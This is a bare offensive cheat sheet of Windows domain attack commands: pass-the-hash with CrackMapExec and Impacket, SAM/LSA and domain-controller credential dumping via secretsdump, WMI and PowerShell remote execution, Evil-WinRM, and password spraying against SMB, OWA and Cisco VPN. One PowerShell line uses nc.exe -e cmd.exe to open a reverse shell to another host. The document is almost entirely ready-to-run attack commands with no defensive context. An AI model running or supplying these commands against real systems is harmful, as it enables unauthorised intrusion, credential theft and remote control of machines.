### Crackmapexec
```
cme-hosts.txt -u username.txt -p password.txt --shares 
crackmapexec smb 192.168.1.1/24 -u Administrator -p '123456@!' -x "net users" 
crackmapexec smb 192.168.1.1/24 -u Administrator -H <NTLM Hash>  -x "hostname" 
crackmapexec smb 192.168.1.10 -u Administrator -H <NTLM Hash> --sam            
crackmapexec smb 192.168.1.10 -u Administrator -H  <NTLM Hash> --lsa            
psexec \\192.168.1.199 -u Administrator -p 123456Ww ipconfig

```
### Impacket Library
```
psexec.py Resilient-Ninja:123456@192.168.1.100 ipconfig 
wmiexec.py Resilient-Ninja:123456@192.168.1.100 ipconfig 
python wmiexec.py -hashes <NTLM Hash> Administrator@192.168.1.100 
python secretsdump.py -hashes <NTLM Hash> -just-dc insomina.io/Administrator@192.168.1.100

```

### Windows Management Instrumentation

```
Invoke-WMIExec -Target john.insomnia -Domain insomnia.io -Username John  -Hash <NTLM Hash> -Command "ipconfig" -verbose
Invoke-WMIExec -Target john.insomnia -Domain insomnia.io -Username John  -Hash <NTLM Hash> -Command "hostanme"

```
### Pass the Ticket Over WMI
```
wmic /authority:"Kerberos: Domain Hostname / Hostname process call create 
wmic /authority:"kerberos:insomnia.io\DC01" /node:DC01.insomnia.io path win32_process call create calc.exe
wmic /authority:"kerberos:insomnia.io\DC01" /node:DC01.insomnia.io "cmd /c ipconfig"
wmic /authority:"kerberos:insomnia.io\DC01" /node:DC01.insomnia.io "cmd /c ipconfig"

```
  ### PowerShell Remoting
 ```
ImpersonateUser CYBER\n.lamb
MakeToken n.lamb cyberbotic.io F3rrari
PowerShell Invoke-Command -ComputerName wkstn-4945 -ScriptBlock { hostname; whoami }
PowerShell $pass=ConvertTo-SecureString "F3rrari" -AsPlainText -Force; $cred=New-Object System.Management.Automation.PSCredential("cyberbotic.io\n.lamb", $pass); Invoke-Command -ComputerName wkstn-4945 -ScriptBlock { hostname; whoami } -Credential $cred
```




### PowerShell Remoting 
```
Invoke-Command -ComputerName john.insomnia.io -Credential $Cred  -ScriptBlock {hostname}
Invoke-Command -ComputerName john.insomnia.io -Credential $Cred  -ScriptBlock {cmd.exe /c nc.exe -v 192.168.1.100 7777 -e cmd.exe}
```


### Evil-WinRM
 
```
proxychains evil-winrm -u john -H <NTLM Hash> -i 192.168.199
```

 ### Password Spraying Attack 
```

crackmapexec smb 192.168.1.1  -d insomnia.io -u john -P /usr/share/wordlists/rockyou.txt
smbclient -N -L \\\\192.168.1.199 | grep Disk | sed 's/^\s*\(.*\)\s*Disk.*/\1/' 
crackmapexec smb 192.168.1.199 -u John -H NTLM Hash 
crackmapexec smb 192.168.1.99 -u '' -p '' #NULL Sessions
spray.sh -smb 192.168.1.100 users.txt /usr/share/wordlists/rockyou.txt  1 35 insomnia.io
spray.sh -owa 192.168.1.100 users.txt  /usr/share/wordlists/rockyou.txt   1 35 Request.body #OWA
spray.sh -cisco 192.168.1.100 usernames.txt /usr/share/wordlists/rockyou.txt 1 35 #CISCO Web VPN
python atomizer.py owa insomnia.io '123456@' emails.txt
```
### Runas
```
runas /netonly /user:nyameeeain "C:\Windows\System32\calc.exe"
runas /netonly /user:nyameeeain powershell
runas /netonly /user:insomnia\nyameeeain "C:\Windows\System32\calc.exe"
```

